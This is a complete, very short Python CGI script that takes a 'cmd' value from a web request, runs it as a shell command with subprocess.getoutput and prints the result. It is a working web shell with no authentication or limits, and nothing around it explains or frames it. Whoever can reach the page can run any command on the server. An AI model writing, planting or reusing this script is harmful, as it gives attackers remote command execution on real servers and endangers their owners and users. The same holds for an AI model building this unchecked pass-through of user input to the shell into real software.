#!/usr/bin/env python3
import cgi
import subprocess

print("Content-Type: text/plain\n")

form = cgi.FieldStorage()
cmd = form.getvalue("cmd")

if cmd:
    result = subprocess.getoutput(cmd)
    print(result)
